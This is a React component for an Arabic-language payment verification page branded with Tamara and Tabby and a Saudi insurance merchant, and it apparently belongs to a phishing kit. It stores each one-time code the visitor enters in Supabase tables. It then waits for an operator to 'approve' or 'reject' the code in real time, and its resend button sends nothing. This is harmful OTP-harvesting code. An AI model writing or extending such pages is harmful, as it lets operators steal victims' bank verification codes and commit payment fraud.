import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
import PaymentLogos from "@/components/PaymentLogos";
import { useOrder } from "@/contexts/OrderContext";
import { supabase } from "@/integrations/supabase/client";
import { toast as sonnerToast } from "sonner";
import { CheckCircle, XCircle, Loader2 } from "lucide-react";

const OtpVerification = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { orderData, updateOrderData } = useOrder();
  const { toast } = useToast();

  const companyName = searchParams.get("company") || "شركة الاتحاد للتأمين التعاوني - تأمين على المركبات ضد الغير";
  const price = searchParams.get("price") || "411.15";
  const cardLast4 = searchParams.get("cardLast4") || "6636";
  const paymentId = searchParams.get("paymentId");
  const paymentType = searchParams.get("type") || "tamara"; // tamara or tabby
  
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [verificationStatus, setVerificationStatus] = useState<"idle" | "loading" | "success" | "error">("idle");
  const [messageIndex, setMessageIndex] = useState(0);
  const [rejectionError, setRejectionError] = useState("");

  const loadingMessages = [
    "جاري التحقق من الكود...",
    "يرجى الانتظار...",
    "جاري التواصل مع النظام...",
    "التحقق من صحة البيانات...",
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== 6 && otp.length !== 4) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز التحقق المكون من 4 أو 6 أرقام",
        variant: "destructive"
      });
      return;
    }
    
    setVerificationStatus("loading");
    setIsLoading(true);
    setRejectionError("");

    updateOrderData({ otpCode: otp });

    try {
      if (paymentId) {
        if (paymentType === "tabby") {
          // حفظ OTP لدفعة Tabby
          try {
            await supabase.from("tabby_otp_attempts").insert({
              payment_id: paymentId,
              otp_code: otp
            });
            console.log("Tabby OTP saved successfully");
          } catch (err) {
            console.error("Error saving Tabby OTP attempt:", err);
          }
        } else {
          // حفظ محاولة OTP لدفعة Tamara
          try {
            await supabase.from("tamara_otp_attempts").insert({
              payment_id: paymentId,
              otp_code: otp
            });
          } catch (err) {
            console.error("Error saving OTP attempt:", err);
          }

          // ثم تحديث OTP في الدفعة الرئيسية لـ Tamara
          const { error } = await supabase
            .from("tamara_payments")
            .update({ otp_code: otp })
            .eq("id", paymentId);

          if (error) throw error;
        }
        
        setIsLoading(false);
        setWaitingApproval(true);
        return;
      }

      if (orderData.sequenceNumber) {
        const { data: orderInfo, error: orderError } = await supabase
          .from("customer_orders")
          .select("id")
          .eq("sequence_number", orderData.sequenceNumber)
          .single();
        
        if (orderError) throw orderError;
        
        await supabase.from("customer_orders").update({
          otp_code: otp,
          status: "waiting_otp_approval"
        }).eq("sequence_number", orderData.sequenceNumber);

        const { error: otpError } = await supabase.from("otp_attempts").insert({
          order_id: orderInfo.id,
          otp_code: otp
        });
        
        if (otpError) console.error("Error saving OTP attempt:", otpError);
        
        setIsLoading(false);
        setWaitingApproval(true);
      }
    } catch (error) {
      console.error("Error updating order:", error);
      setIsLoading(false);
      setVerificationStatus("error");
      setTimeout(() => {
        setVerificationStatus("idle");
        setOtp("");
      }, 3000);
      toast({
        title: "خطأ",
        description: "حدث خطأ في إرسال رمز التحقق",
        variant: "destructive"
      });
    }
  };

  // Rotate loading messages
  useEffect(() => {
    if (verificationStatus === "loading" || waitingApproval) {
      const interval = setInterval(() => {
        setMessageIndex((prev) => (prev + 1) % loadingMessages.length);
      }, 2000);
      return () => clearInterval(interval);
    }
  }, [verificationStatus, waitingApproval]);

  // Listen for admin approval/rejection - بدء الاستماع فور دخول الصفحة
  useEffect(() => {
    if (!paymentId && !orderData.sequenceNumber) return;

    if (paymentId) {
      if (paymentType === "tabby") {
        console.log('Setting up Tabby OTP approval listener for payment:', paymentId);
        
        const channel = supabase
          .channel('tabby-otp-approval')
          .on('postgres_changes', {
            event: 'UPDATE',
            schema: 'public',
            table: 'tabby_otp_attempts',
            filter: `payment_id=eq.${paymentId}`
          }, async (payload: any) => {
            console.log('Tabby OTP status update received:', payload);
            const approvalStatus = payload.new.approval_status;
            console.log('New approval status:', approvalStatus);
            
            if (approvalStatus === 'approved') {
              console.log('OTP approved! Redirecting to home...');
              setWaitingApproval(false);
              setVerificationStatus("success");
              
              // عرض رسالة النجاح لمدة 2 ثانية ثم الانتقال للصفحة الرئيسية
              setTimeout(() => {
                window.location.href = "/";
              }, 2000);
            } else if (approvalStatus === 'rejected') {
              console.log('OTP rejected! Resetting form...');
              setWaitingApproval(false);
              setVerificationStatus("error");
              
              // عرض رسالة الخطأ لمدة 3 ثواني ثم العودة لصفحة التحقق
              setTimeout(() => {
                setVerificationStatus("idle");
                setOtp("");
              }, 3000);
            }
          })
          .subscribe((status) => {
            console.log('Subscription status:', status);
          });

        return () => {
          console.log('Cleaning up Tabby OTP approval listener');
          supabase.removeChannel(channel);
        };
      } else {
        console.log('Setting up Tamara OTP approval listener for payment:', paymentId);
        
        const channel = supabase
          .channel('tamara-otp-approval')
          .on('postgres_changes', {
            event: 'UPDATE',
            schema: 'public',
            table: 'tamara_payments',
            filter: `id=eq.${paymentId}`
          }, async (payload: any) => {
            console.log('Tamara payment status update received:', payload);
            const newStatus = payload.new.payment_status;
            console.log('New payment status:', newStatus);
            
            if (newStatus === 'completed') {
              console.log('Payment completed! Redirecting to home...');
              setWaitingApproval(false);
              setVerificationStatus("success");
              
              // عرض رسالة النجاح لمدة 2 ثانية ثم الانتقال للصفحة الرئيسية
              setTimeout(() => {
                window.location.href = "/";
              }, 2000);
            } else if (newStatus === 'otp_rejected') {
              console.log('OTP rejected! Resetting form...');
              setWaitingApproval(false);
              setVerificationStatus("error");
              
              // إعادة الحالة إلى pending لإعطاء فرصة لإدخال OTP جديد
              await supabase
                .from("tamara_payments")
                .update({ payment_status: 'pending' })
                .eq("id", paymentId);
              
              // عرض رسالة الخطأ لمدة 3 ثواني ثم العودة لصفحة التحقق
              setTimeout(() => {
                setVerificationStatus("idle");
                setOtp("");
              }, 3000);
            }
          })
          .subscribe((status) => {
            console.log('Subscription status:', status);
          });

        return () => {
          console.log('Cleaning up Tamara OTP approval listener');
          supabase.removeChannel(channel);
        };
      }
    }

    if (!orderData.sequenceNumber) return;
    
    const channel = supabase.channel('otp-approval-changes').on('postgres_changes', {
      event: 'UPDATE',
      schema: 'public',
      table: 'customer_orders',
      filter: `sequence_number=eq.${orderData.sequenceNumber}`
    }, (payload: any) => {
      const newStatus = payload.new.status;
      if (newStatus === 'completed') {
        setWaitingApproval(false);
        setVerificationStatus("success");
        setTimeout(() => navigate('/payment-success'), 2000);
      } else if (newStatus === 'otp_rejected') {
        setWaitingApproval(false);
        setVerificationStatus("error");
        setTimeout(() => {
          setVerificationStatus("idle");
          setOtp("");
        }, 3000);
      }
    }).subscribe();
    
    return () => {
      supabase.removeChannel(channel);
    };
  }, [paymentId, orderData.sequenceNumber, navigate]);

  const handleResendCode = () => {
    toast({
      title: "تم إعادة الإرسال",
      description: "تم إرسال رمز تحقق جديد إلى هاتفك"
    });
  };

  const currentTime = new Date().toLocaleString('ar-EG', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false,
    calendar: 'gregory'
  });

  // If showing loading, success, or error screen
  if (verificationStatus !== "idle") {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" dir="rtl">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-8">
          <div className="flex flex-col items-center justify-center min-h-[300px]">
            {verificationStatus === "loading" && (
              <>
                <div className="relative w-24 h-24 mb-6">
                  <div className="absolute inset-0 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
                  <div className="absolute inset-2 border-4 border-primary/40 border-t-transparent rounded-full animate-spin" style={{ animationDirection: 'reverse', animationDuration: '1s' }}></div>
                </div>
                <p className="text-xl font-bold text-center mb-2 animate-fade-in">
                  {loadingMessages[messageIndex]}
                </p>
                <p className="text-sm text-muted-foreground text-center">
                  يرجى الانتظار، لا تغلق هذه النافذة
                </p>
              </>
            )}

            {verificationStatus === "success" && (
              <>
                <div className="w-24 h-24 mb-6 bg-green-100 rounded-full flex items-center justify-center animate-scale-in">
                  <CheckCircle className="w-16 h-16 text-green-600" />
                </div>
                <p className="text-xl font-bold text-center text-green-600 mb-2">
                  تم التحقق بنجاح!
                </p>
                <p className="text-sm text-muted-foreground text-center">
                  جاري تحويلك لصفحة النجاح...
                </p>
              </>
            )}

            {verificationStatus === "error" && (
              <>
                <div className="w-24 h-24 mb-6 bg-red-100 rounded-full flex items-center justify-center animate-scale-in">
                  <XCircle className="w-16 h-16 text-red-600" />
                </div>
                <p className="text-xl font-bold text-center text-red-600 mb-2">
                  رمز التحقق غير صحيح
                </p>
                <p className="text-sm text-muted-foreground text-center">
                  يرجى إعادة إدخال الرمز الصحيح...
                </p>
              </>
            )}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" dir="rtl">
      <div className="w-full max-w-2xl bg-white border border-gray-300 rounded-lg shadow-sm p-6 animate-fade-in">
        <div className="flex items-center justify-between mb-4">
          <button onClick={() => navigate(-1)} className="text-gray-600 hover:underline text-sm">
            إلغاء
          </button>
          <PaymentLogos />
        </div>

        <div className="flex justify-center mb-4"></div>
        <hr className="my-4 border-gray-400" />

        <div className="text-left mb-4">
          <a href="#" className="text-sm text-[#4b6e8c] underline">
            English
          </a>
        </div>

        <h1 className="text-2xl font-bold text-black mb-4">
          التحقق من عملية الدفع
        </h1>

        <p className="mb-4 text-gray-700">
          يرجى ادخال رمز التحقق المُرسل إلى الرقم المسجل لإتمام عملية الشراء من :
        </p>

        <div className="space-y-1 mb-4 text-sm">
          <div>
            <span className="font-bold">المتجر</span>: <span>{companyName}</span>
          </div>
          <div>
            <span className="font-bold">المبلغ</span>: <span dir="ltr">{price} SAR</span>
          </div>
          <div>
            <span className="font-bold">الوقت</span>: <span>{currentTime}</span>
          </div>
        </div>

        <div className="font-bold text-black mb-6">
          تسوّق ممتع!
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {rejectionError}
          
          <div>
            <div className="text-center text-gray-600 mb-2 text-sm">
              رمز التحقق
            </div>
            <Input
              type="text"
              maxLength={6}
              value={otp}
              onChange={e => setOtp(e.target.value.replace(/\D/g, ''))}
              className="w-full text-center text-lg tracking-widest py-2 outline-none border-0 border-b-2 border-gray-300 focus-visible:ring-0 focus-visible:border-gray-600 rounded-none"
              placeholder=""
              dir="ltr"
              disabled={waitingApproval}
            />
          </div>

          <button
            type="submit"
            className="w-full py-3 bg-[#2900fc] hover:bg-[#2200cc] text-white font-medium transition-colors rounded disabled:opacity-50 disabled:cursor-not-allowed"
            disabled={isLoading || waitingApproval || (otp.length !== 6 && otp.length !== 4)}
          >
            {isLoading ? "جاري التحقق..." : waitingApproval ? "في انتظار الموافقة..." : "تأكيد"}
          </button>
        </form>

        <div className="mt-12 text-center">
          <button type="button" onClick={handleResendCode} className="text-[#2900fc] hover:underline">
            إعادة إرسال الرمز
          </button>
        </div>

        <div className="mt-12">
          <Accordion type="single" collapsible className="space-y-2">
            <AccordionItem value="auth" className="border-none">
              <AccordionTrigger className="text-[#2900fc] hover:no-underline text-right">
                تعرف على المزيد حول المصادقة
              </AccordionTrigger>
              <AccordionContent className="text-black text-sm">
                يرجى الاتصال بخدمة العملاء على : 8001000081
              </AccordionContent>
            </AccordionItem>
            
            <AccordionItem value="help" className="border-none">
              <AccordionTrigger className="text-[#2900fc] hover:no-underline text-right">
                بحاجة لبعض المساعدة ؟
              </AccordionTrigger>
              <AccordionContent className="text-black text-sm">
                يرجى الاتصال بخدمة العملاء على : 8001000081
              </AccordionContent>
            </AccordionItem>
          </Accordion>
        </div>
      </div>
    </div>
  );
};

export default OtpVerification;
